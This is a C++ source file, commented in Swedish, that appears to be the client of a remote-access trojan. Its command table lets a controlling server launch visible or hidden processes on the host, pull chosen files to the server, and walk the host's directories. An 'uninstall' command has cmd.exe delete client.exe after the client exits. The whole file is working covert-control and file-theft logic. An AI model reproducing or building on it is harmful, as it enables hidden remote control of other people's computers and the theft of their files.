#pragma once
#include "precompile.h"
#include "client.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"process-v", payload::process_execution_show}, // för att starta en process
		{"process-h", payload::process_execution_hidden}, // för att starta en gömd process
		{"download", payload::download_file} // för att över föra en fil till servern
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }}, // för att stänga ner klienten
		{"uninstall", [&](std::string) { // för att avinstallera klienten
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},
		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
			directory manager(data); //antag data är bas directory
			helper::send_directory(client_implentation, manager.current_directory()); // skicka bas mappen

			packet paket = client_implentation.receive_packet(); // ta emot respons
			while (paket.id != "dir_action" && paket.data != "done") { // medans server inte är klar, klienten kommer aldrig att fastna i den här loppen eftersom att den kallar recv vilket gör att den kan ominitializera instansen
				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte är tomt
					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska gå in i en undermapp
						helper::send_directory(client_implentation, manager.descend(std::stoi(paket.data))); // gå in och skicka undermappen
					}
				}
				paket = client_implentation.receive_packet(); // ta emot nästa instruktion från servern
			}
		}}
	};
}